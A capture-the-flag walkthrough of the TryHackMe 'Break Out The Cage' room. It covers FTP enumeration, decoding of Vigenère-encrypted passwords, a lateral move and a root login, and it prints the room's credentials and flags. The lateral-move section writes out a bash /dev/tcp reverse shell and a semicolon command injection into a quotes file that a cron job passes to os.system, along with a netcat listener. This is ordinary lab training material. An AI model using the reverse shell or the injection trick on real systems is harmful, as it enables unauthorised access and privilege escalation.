# Break Out The Cage

## Description

Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

Let's find out what his agent is up to....

## Initial Scan

Let's start with an Nmap scan. The scan reveals three open ports:

* 21 ftp (anonymous login allowed)
* 22 ssh
* 80 http

~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.**.**
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dd:fd:88:94:f8:c8:d1:1b:51:e3:7d:f8:1d:dd:82:3e (RSA)
|_  256 3e:ba:38:63:2b:8d:1c:68:13:d5:05:ba:7a:ae:d9:3b (ECDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Nicholas Cage Stories
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## FTP

Let's start with the ftp service, since anonymous login is allowed. I found a file there named `dad_tasks` which was base64 encoded:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Break_Out_The_Cage/files]
└─$ ftp $IP
Connected to 10.10.180.15.
220 (vsFTPd 3.0.3)
Name (10.10.180.15:user): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 May 25  2020 .
drwxr-xr-x    2 0        0            4096 May 25  2020 ..
-rw-r--r--    1 0        0             396 May 25  2020 dad_tasks
226 Directory send OK.
ftp> get dad_tasks

[REDACTED]                                                                                                 
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Break_Out_The_Cage/files]
└─$ cat dad_tasks 
UWFwdyBFZWtjbCAtIFB2ciBSTUtQLi4uWFpXIFZXVVIuLi4gVFRJIFhFRi4uLiBMQUEgWlJHUVJP [REDACTED]
~~~

## Weston's Password

After decoding `dad_tasks`, we face this ciphertext:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Break_Out_The_Cage/files]
└─$ cat dad_tasks | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
~~~

It is encrypted with Vigenère cipher and we don't have a key to decrypt it. I searched a bit and found [this](https://www.guballa.de/vigenere-solver) website that kinda brute-forces the key for decryption.

Just copy the ciphertext and paste it in the input field. Then change the language to "English" and click on "Break Cipher" and wait a bit. The key for decryption is `namelesstwo` and the ciphertext decrypts to the following which contains Weston's password:

```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... Mydadisghostrideraintthatcoolnocausehesonfirejokes
```

Weston's password: `Mydadisghostrideraintthatcoolnocausehesonfirejokes`

## Weston -> cage (lateral move)

Now we can cannect to the machine via ssh using the creds we have (`weston:Mydadisghostrideraintthatcoolnocausehesonfirejokes`). After logging into the machine as `weston`, I checked the files in our home directory and there is nothing useful. I decided to check my sudo permissions using `sudo -l`:

~~~
weston@national-treasure:~$ sudo -l
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
~~~

As you can see we can run a file named `bees` as `root`, with sudo and no password. Let's see what it does:

~~~
weston@national-treasure:~$ bees
                                                                               
Broadcast message from weston@national-treasure (pts/0) (Sat Dec 11 08:46:32 20
                                                                               
AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!
~~~

It just printing out a message. Let's check its code and ownership:

~~~
weston@national-treasure:~$ ls -la /usr/bin/bees
wxr-xr-x 1 root root 56 May 25  2020 /usr/bin/bees
weston@national-treasure:~$ cat /usr/bin/bees 
#!/bin/bash

wall "AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!"
~~~

As you can see, it is a simple bash script that broadcasts a message using `wall` command and it is owned by root and we have no write access. Let's look further into the machine to see what we can find.

If you haven't already, list the files in `/home` and you can see the two existing users on the machine: `cage` and `weston`. Let's look for the files owned by the other user, `cage`:

~~~
weston@national-treasure:~$ find / -type f -user cage 2>/dev/null
/opt/.dads_scripts/spread_the_quotes.py
/opt/.dads_scripts/.files/.quotes
~~~

We found a hidden folder in `/opt` named `.dads_scripts` which is owned by user `cage`. By navigating to this directory, we see a python script named `spread_the_quotes.py`. Let's see what it does:

~~~py
#!/usr/bin/env python

#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
~~~

It randomly chooses a line from another file in the same directory (`.files/.quotes`) and uses `wall` command to broadcast those lines. Let's check where the source of the lines is. There is a hidden folder in `/opt/.dads_scripts`, named `.files` that contains a file named `.quotes`. Let's check the content of this file:

~~~
weston@national-treasure:/opt/.dads_scripts$ cd .files/
weston@national-treasure:/opt/.dads_scripts/.files$ cat .quotes 
"That's funny, my name's Roger. Two Rogers don't make a right!" — Gone in Sixty Seconds
"Did I ever tell ya that this here jacket represents a symbol of my individuality, and my belief in personal freedom?" — Wild at Heart

[REDACTED]

"It's like we're on two different channels now. I'm CNN and she's the Home Shopping Network." — It Could Happen to You
~~~

It is just a lot of quotes from different people. I haven't pointed this out yet, but if you're doing the room with me, you have noticed a cronjob which is running the python script that we saw earlier which broadcasts the same lines that we see here, every 3 minutes.

### Exploit

We don't have write access to the python script, but we can replace the messages with a reverse shell and how is it going to be executed you might ask. Well, if you take another look at the python script, you can see that the last line of the code is running `wall` command plus the quote variable:

~~~py
os.system("wall " + quote)
~~~

We are changing this variable to a bash reverse shell and by adding a semicolon (`;`) to the start of our payload, we end the `wall` command and run our reverse shell.

Here's how it's done. First open a listener (`rlwrap nc -lvnp 4444`) and then we need to create our reverse shell in a file to be able to copy it and after doing so, we mark it as executable. Finally we do the replacement using `printf` (Don't forget to add your IP to the last command):

~~~
$ cat > /tmp/shell.sh << EOF
> #!/bin/bash
> bash -i >& /dev/tcp/<YOUR IP>/4444 0>&1
> EOF
$ chmod +x /tmp/shell.sh 
$ printf 'sth;/tmp/shell.sh\n' > /opt/.dads_scripts/.files/.quotes
~~~

Now if you have done everything right, you should have a shell as user `cage` in your listener:

~~~
┌──(user㉿Y0B01)-[~/…/walkthroughs/thm/Break_Out_The_Cage/files]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.**.**] from (UNKNOWN) [10.10.180.15] 39716
bash: cannot set terminal process group (1456): Inappropriate ioctl for device
bash: no job control in this shell
cage@national-treasure:~$ id
uid=1000(cage) gid=1000(cage) groups=1000(cage),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
~~~

## User Flag

Now if you list the files in `cage`'s home directory, you can see a file named `Super_Duper_Checklist` which contains the user flag:

~~~
cage@national-treasure:~$ ls
email_backup
Super_Duper_Checklist
cage@national-treasure:~$ cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{M37AL_0R_P3N_T35T1NG}
~~~

User flag: `THM{M37AL_0R_P3N_T35T1NG}`

## Privilege Escalation

At this point I added my public key to cage's `authorized_keys` to be able to connect via ssh and have a stable shell. If you don't know how to do this, you can use `ssh-keygen` to creat a key and add the content of the file with `.pub` extention to `authorized_keys` on the target machine. If you can't figure it out, just do a quick search. It is pretty simple.

Let's continue with the room. Now we need to gain root access in order to obtain the root flag. First I checked the directory named `email_backup` in cage's home directory and it contained three emails. I read all of them and the third one had something interesting:

~~~
cage@national-treasure:~/email_backup$ cat email_3
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
~~~

As you probably noticed, there is a weird string in the middle of the email. I realized that it is a Vigenère ciphertext and We need a key to decrypt it. I tried to use the website that we used early on the room, but I didn't get any valid result.

After I read the last email again, I realized that the word `face` has been used many times. I tested it as the key and got a readble result. Using the key `face`, we get this string: `cageisnotalegend`

I tried it as the password for root and it worked! As you can see below, we successfully switched to root user:

~~~
cage@national-treasure:~/email_backup$ su root
Password: 
root@national-treasure:/home/cage/email_backup# id
uid=0(root) gid=0(root) groups=0(root)
~~~

## Root Flag

Now that we are root, we can head to `/root` directory and find the root flag. If you list the files in root's directory, you'll see a directory named `email_backup` that contains two emails and the root flag is in the second one:

~~~
root@national-treasure:/home/cage/email_backup# cd /root/email_backup/
root@national-treasure:~/email_backup# cat email_2
From - master@ActorsGuild.com
To - SeanArcher@BigManAgents.com

Dear Sean

I'm very pleased to here that Sean, you are a good disciple. Your power over him has become
strong... so strong that I feel the power to promote you from disciple to crony. I hope you
don't abuse your new found strength. To ascend yourself to this level please use this code:

THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}

Thank you

Sean Archer
~~~

Root flag: `THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}`

# D0N3! ; )

Thanks to the creator(s) of this room!

Hope you had fun and learned something.

Have a g00d 0ne! : )